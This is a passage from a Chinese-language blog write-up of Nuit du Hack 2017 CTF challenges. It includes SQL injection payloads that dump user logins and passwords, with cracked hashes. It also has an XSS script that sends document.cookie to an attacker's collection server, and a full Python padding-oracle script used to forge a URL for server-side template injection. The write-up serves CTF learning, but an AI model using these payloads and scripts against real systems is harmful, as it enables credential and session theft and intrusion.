<p style="max-width:100%;height:auto;">得到ans提交就拿到flag了
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfabfecfc1e24516000000.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web120divideandrule">web-120 Divide and rule</h2>
<p style="max-width:100%;height:auto;">首先点进去是个登陆页面，
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfac6ccfc1e24516000002.png" style="max-width:100%;height:auto;"/><br/>
然后去<code style="max-width:100%;height:auto;">search</code>那儿找东西
发现那一堆查询参数是存在注入的，随便加个单引号就不返回值了。
然后尝试联合查询发现还是不返回，后来想到这么多参数很可能是长度受了限制，然后就分开来，最后测试成功，如下：</p>
<pre><code class="sql language-sql" style="max-width:100%;height:auto;">firstname=&amp;apos;union select/*&amp;lastname=*/1,2,3,4,5,6#&amp;position=&amp;country=123&amp;gender=
</code></pre>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfad33cfc1e24516000003.png" style="max-width:100%;height:auto;"/><br/>
但是有一个问题就是，长度限制后来测出来好像是15，这样子没办法查表名和列名之类的，因为<code style="max-width:100%;height:auto;">information_schema</code>太长了。
后来脑洞了一下猜到表名是<code style="max-width:100%;height:auto;">users</code>，
然后根据初始登录页面的name猜到字段名分别是<code style="max-width:100%;height:auto;">login</code>和<code style="max-width:100%;height:auto;">password</code></p>
<pre><code class="sql language-sql" style="max-width:100%;height:auto;">firstname=&amp;apos;union select/*&amp;lastname=*/login/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=

firstname=&amp;apos;union select/*&amp;lastname=*/password/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=
</code></pre>
<p style="max-width:100%;height:auto;">得到三个用户名和三个md5的密码值，MD5解密之后登陆就拿到flag了</p>
<pre><code style="max-width:100%;height:auto;">#三个用户名
ruleradmin
patrick
raoul

#三个密码
04fc95a5debc7474a84fad9c50a1035d #smart1985
db6eab0550da4b056d1a33ba2e8ced66 #1badgurl
7ac89e3c1f1a71ee19374d7e8912714b #1badboy
</code></pre>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfae16cfc1e24516000004.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web200purplepossemarket">web-200 Purple Posse Market</h2>
<p style="max-width:100%;height:auto;">进去之后研究半天，发现有一个contact页面可以提交一些东西，然后其他好像也没有太多用，题目描述让拿到管理员的IBAN账户。那多半是xss拿到cookie登陆后台了，然后在评论这里尝试提交，发现根本没有过滤，下面代码直接就能返回</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script src="http://你的xss平台"&gt;&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">刚开始做的时候bot巨慢无比。。10多分钟才打回来知道没有过滤，白白浪费我半天，后来突然就变快了。。。僵硬。。
回到题目，既然没有过滤，那么直接执行js就好了，提交如下：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script src="http://你的网址/requests.js"&gt;&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后这个<code style="max-width:100%;height:auto;">request.js</code>这样写的</p>
<pre><code class="js language-js" style="max-width:100%;height:auto;">$.get("http://你的xss平台?a="+document.cookie,function(data,status){})
</code></pre>
<p style="max-width:100%;height:auto;">截图如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfaf91cfc1e24516000005.png" style="max-width:100%;height:auto;"/><br/>
登陆进去就能看到IBAN账户，这就是flag了。</p>
<h2 id="web250whyunoknock">web-250 WhyUNoKnock</h2>
<h2 id="crypto250markisfaillingdowndrunk">crypto-250 MarkIsFaillingDownDrunk</h2>
<p style="max-width:100%;height:auto;">进去之后随便点一个，发现链接变成这个</p>
<pre><code style="max-width:100%;height:auto;">http://markisfaillingdowndrunk.quals.nuitduhack.com/view/deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">这一看都不用想，80%是<code style="max-width:100%;height:auto;">padding oracle</code>，
然后开始写代码，先把他的几串东西的明文搞出来，代码如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
import base64
import time
url=&amp;apos;http://markisfaillingdowndrunk.quals.nuitduhack.com/view/&amp;apos;
N=16
phpsession=""
ID=""
def inject(param):
    result=requests.get(url+param)
    #print result.content
    return result

def xor(a, b):
    print "length",len(a),len(b)
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher): ##return middle
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode(&amp;apos;hex&amp;apos;)
            result=inject(c.encode(&amp;apos;hex&amp;apos;))
            if result.status_code!=500:
                print j
                get=chr(j^i)+get
                break
    return get
s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
"deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
IV=s[0][:16]
#str4
ans=[]
for i in xrange(4):
    c=[]
    str1=s[i].decode(&amp;apos;hex&amp;apos;)
    #print s[i]
    #print str1
    for j in xrange(0,len(str1),N):
        c.append(str1[j:j+N])
    l=len(c)
    print l
    p=[""]*l
    for j in xrange(l-1,0,-1):
        middle=padding_oracle(N,c[j])
        print "========================middle================================"
        print j
        print middle.encode(&amp;apos;hex&amp;apos;)
        p[j]=xor(middle,c[j-1])
        print p[j]
    print "==========================plain==============================="
    print i
    print p
    ans.append(p)
print ans
</code></pre>
<p style="max-width:100%;height:auto;">服务器真是慢的我想日狗了，做了那么多<code style="max-width:100%;height:auto;">padding oracle</code>，从来没有遇到这么慢的服务器好吧。。。平均一个一分钟，一组就是16分钟，光跑第一串出来就用了n久。。。
然后我是开了两个程序顺序反序一起跑，把第一串和第四串跑出来是个这样的东西，</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">1：https://gist.githubusercontent.com/MarkIsFaillingDownDrunk/b9ed0141c97ae6488379dafa088c04d2/raw/4129795e82bb978e78b00bcb9b9fc4b6acb44898/test.md\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10

4：https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02
</code></pre>
<p style="max-width:100%;height:auto;">访问一下，内容是这个</p>
<pre><code class="markdown language-markdown" style="max-width:100%;height:auto;"># Welcome to MarkParser !
## This is a simple Markdown test.

Test for dynamic rendering :

[{{ config[&amp;apos;WEBSITE_NAME&amp;apos;] }}](/)
</code></pre>
<p style="max-width:100%;height:auto;">再看看它网页的内容
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb189cfc1e24516000006.png" style="max-width:100%;height:auto;"/><br/>
这样就很明白了，
也就是说他的<code style="max-width:100%;height:auto;">view</code>后面直接跟的链接。他会读取链接的内容，然后进行<code style="max-width:100%;height:auto;">markdown</code>转换，然后在进行模板渲染。
所以接下来的思路也就很明确很简单了，让它访问我们的网站预先放好的<code style="max-width:100%;height:auto;">md</code>，然后就是个<code style="max-width:100%;height:auto;">ssti</code>了，通过一些奇怪姿势找到执行命令或是读取文件的函数就行了。
这里由于有了第四个链接，所以我构造一个目录如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">第四个密文对应明文: https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02
我的网页          : http://104.160.43.154:8000/xxxxxxxxxxxxxxxxxxxxx/master/README\x02\x02
</code></pre>
<p style="max-width:100%;height:auto;">最后一组明文和他密文解密出来的一样，这样我就可以维持最后一个分组密文以及倒数第二个分组的密文不变了。然后依次通过<code style="max-width:100%;height:auto;">padding oracle</code>获取中间值，与构造的密文异或得到构造的密文，从而得到我的网址对应的密文
至于具体<code style="max-width:100%;height:auto;">padding oracle</code>伪造明文的原理这里不赘述了，可以去看我之前的博客或是直接私聊我。
代码如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
import base64
import time
url=&amp;apos;http://markisfaillingdowndrunk.quals.nuitduhack.com/view/&amp;apos;
N=16
phpsession=""
ID=""
def inject(param):
    result=requests.get(url+param)
    #print result.content
    return result

def xor(a, b):
    print "length",len(a),len(b)
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher): ##return middle
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode(&amp;apos;hex&amp;apos;)
            result=inject(c.encode(&amp;apos;hex&amp;apos;))
            if result.status_code!=500:
                print j
                get=chr(j^i)+get
                break
    return get
&amp;apos;&amp;apos;&amp;apos;
s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
"deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
IV=s[0][:16]
#str4
ans=[]
for i in xrange(4):
    c=[]
    str1=s[i].decode(&amp;apos;hex&amp;apos;)
    #print s[i]
    #print str1
    for j in xrange(0,len(str1),N):
        c.append(str1[j:j+N])
    l=len(c)
    print l
    p=[""]*l
    for j in xrange(l-1,0,-1):
        middle=padding_oracle(N,c[j])
        print "========================middle================================"
        print j
        print middle.encode(&amp;apos;hex&amp;apos;)
        p[j]=xor(middle,c[j-1])
        print p[j]
    print "==========================plain==============================="
    print i
    print p
    ans.append(p)
print ans
&amp;apos;&amp;apos;&amp;apos;


&amp;apos;&amp;apos;&amp;apos;
1    :   https://gist.githubusercontent.com/MarkIsFaillingDownDrunk/b9ed0141c97ae6488379dafa088c04d2/raw/4129795e82bb978e78b00bcb9b9fc4b6acb44898/test.md\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10
2    :
3    :
4    :   https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02
myans:   http://104.160.43.154:8000/xxxxxxxxxxxxxxxxxxxxx/master/README\x02\x02

&amp;apos;&amp;apos;&amp;apos;

cipher=[
        "deadbeefcafedeadbeefcafe04030201",
        "52208110d1a06ce628ff8e10f4cbc1aa",
        "96ac276f57b6d80e50df1050c455fdf4",
        "40d56ae51399ceb30b5b69153ddc2302",
        "19e3f662023665e8885c90867b8c3a02"
        ]
middle=[
        &amp;apos;b6d9ca9fb9c4f182cc8ebdd0636a7669&amp;apos;,
        &amp;apos;2742f463b4d20f89468beb7e80e5a2c5&amp;apos;,
        &amp;apos;fb8343033ec2a22120a67322bd25899b&amp;apos;,
        &amp;apos;6fb80b9667fcbc9c591e285170992100&amp;apos;
        ]
ans   =[
        "http://104.160.4",
        "3.154:8000/xxxxx",
        "xxxxxxxxxxxxxxxx",
        "/master/README\x02\x02"
       ]

tmp_ans=[""]*5

tmp_ans[4]=cipher[4]
tmp_ans[3]=cipher[3]
tmp_middle=middle[2].decode(&amp;apos;hex&amp;apos;)
tmp_ans[2]=xor(ans[2],tmp_middle).encode("hex")

tmp_middle=padding_oracle(N,tmp_ans[2].decode("hex"))
print tmp_middle.encode(&amp;apos;hex&amp;apos;)   #"9d41e1434f05be3bea284b8d2eb8928b".decode(&amp;apos;hex&amp;apos;)

tmp_ans[1]=xor(ans[1],tmp_middle).encode("hex")
tmp_middle=padding_oracle(N,tmp_ans[1].decode("hex"))
print tmp_middle.encode(&amp;apos;hex&amp;apos;)   #"c05b49fef1d14b17aa0dd98a591ea57f".decode(&amp;apos;hex&amp;apos;)

tmp_ans[0]=xor(ans[0],tmp_middle).encode("hex")
view="".join(i for i in tmp_ans)
print view
#a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">通过上述代码，我得到我的这个链接<code style="max-width:100%;height:auto;">http://104.160.43.154:8000/xxxxxxxxxxxxxxxxxxxxx/master/README</code>对应的密文是</p>
<pre><code style="max-width:100%;height:auto;">a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">然后我修改我的网站的<code style="max-width:100%;height:auto;">README</code>的内容为
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb47acfc1e24516000007.png" style="max-width:100%;height:auto;"/><br/>
注意下我的这个内容外面包了两个反撇号，因为我们刚才说了，他会读取链接的内容，然后进行<code style="max-width:100%;height:auto;">markdown</code>转换，然后在进行模板渲染。<code style="max-width:100%;height:auto;">markdown</code>，转换在先，很多我们需要用的符号在<code style="max-width:100%;height:auto;">markdown</code>里面都有特殊语义会被转换，加上这两个反撇号就好了。
然后尝试访问</p>
<pre><code style="max-width:100%;height:auto;">http://markisfaillingdowndrunk.quals.nuitduhack.com/view/a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">结果如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb502cfc1e24516000008.png" style="max-width:100%;height:auto;"/><br/>
成功了，
好的，接下来就找出<code style="max-width:100%;height:auto;">SSTI</code>的payload执行一波命令，发现失败了，经过一番测试才知道题目用的环境是<code style="max-width:100%;height:auto;">python3</code>，而平时做的题目之类的都是<code style="max-width:100%;height:auto;">python2</code>，那么开始在python3下面寻找姿势。
找了n久n久，终于找到了
最后<code style="max-width:100%;height:auto;">payload</code>如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb5a0cfc1e24516000009.png" style="max-width:100%;height:auto;"/><br/>
直接访问得到flag如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb5bacfc1e2451600000a.png" style="max-width:100%;height:auto;"/><br/></p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles godness">
<aside>
<div class="Bendawang" id="Bendawang" style="position:absolute;">
<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
<div class="Bendawang_content" id="Bendawang_content"></div>

<img class="yukino" id="yukino" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/41.png" style="position:absolute;"/>




<footer>
<div class="show-on-mobiles">
<div style="display:inline-block">
<div style="vertical-align:middle;">
            Copyright©
            <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
</div>
</div>
<div style="vertical-align:middle;">
<span>Designed By</span>
<a href="http://blog.csdn.net/qq_19876131"><img src="./Nuit-du-hack-2017-web-and-crypto-Writeup/bendawang2.png"/></a>
</div>
</div>
<div class="grid hide-on-mobiles">
<div class="unit one-third center-on-mobiles">
<div class="copyright">
          Copyright©
          <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
</div>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>Designed By
          <a href="http://blog.csdn.net/qq_19876131">
<img src="./Nuit-du-hack-2017-web-and-crypto-Writeup/bendawang2.png"/>
</a>
</p>
</div>
</div>
</footer>
<script src="./Nuit-du-hack-2017-web-and-crypto-Writeup/prism.js"></script>
<script src="./Nuit-du-hack-2017-web-and-crypto-Writeup/zooming.js"></script>
<script src="./Nuit-du-hack-2017-web-and-crypto-Writeup/Bendawang.js"></script>


